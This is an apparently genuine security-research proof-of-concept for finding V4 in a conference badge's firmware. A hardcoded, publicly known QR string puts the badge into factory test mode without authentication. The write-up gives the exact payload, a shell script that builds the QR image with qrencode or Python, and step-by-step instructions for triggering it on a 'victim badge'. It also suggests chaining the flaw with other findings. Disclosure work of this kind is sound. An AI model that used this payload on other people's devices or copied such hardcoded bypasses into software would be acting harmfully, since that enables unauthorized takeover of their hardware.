# PoC 02 — factory mode via hardcoded QR constant

Finding V4, `dc34-vault/src/main.rs:824`, CWE-798 / CWE-306. **LIVE CONFIRMED on hardware.**

## Payload

A QR code containing the exact string:

```
factory://factory-aae949f6969-lorem-ipsum-data
```

## Why it works

When base45 decoding fails, the QR handler does `split_once("://")` and, in the factory arm, checks `data == FACTORY_STANDALONE_STRING`. That constant is published in the open-source repo, so the only "authentication" is knowing a public string. Any badge that scans this drops into factory standalone test mode.

## Generate the QR

Run the shared generator, which writes `factory.png`:

```
./gen_qr.sh
```

What that script does (from `gen_qr.sh`): a `gen()` helper that tries `qrencode`, then `python3 qrcode`, then falls back to printing the raw payload for a phone app, called on both PoC payloads:

```bash
gen() {
  local text="$1" out="$2"
  if command -v qrencode >/dev/null 2>&1; then
    qrencode -s 8 -o "$out" "$text"
  elif python3 -c "import qrcode" >/dev/null 2>&1; then
    python3 -c "import qrcode,sys; qrcode.make(sys.argv[1]).save(sys.argv[2])" "$text" "$out"
  else
    echo "payload for a phone QR app -> $text"
  fi
}

gen '00' "$here/crash.png"                                        # PoC 01, vault crash
gen 'factory://factory-aae949f6969-lorem-ipsum-data' "$here/factory.png"   # PoC 02, factory mode
```

To make this one by hand instead: `qrencode -s 8 -o factory.png 'factory://factory-aae949f6969-lorem-ipsum-data'`.

## Steps

Same as the crash: the **center button is the camera shutter**, so the only victim action is taking a picture.

1. Show `factory.png` to the victim badge (phone screen or printout in front of the camera).
2. **Press the badge's center button to take the picture.** That single capture is the scan.
3. The badge leaves the conference interface and drops into the factory standalone test sequence (starts with the jog-press prompt).
4. Complete or time out the sequence, or reboot, to return to normal.

## What to observe (escalation question)

Watch what factory mode actually unlocks. If it re-enables the ungated `test` console commands (PoC 03), relaxes any checks, or exposes hardware test menus, then V4 is an escalation enabler that compounds with C1/C2, not just a nuisance. Note down exactly what the factory sequence does and report it.
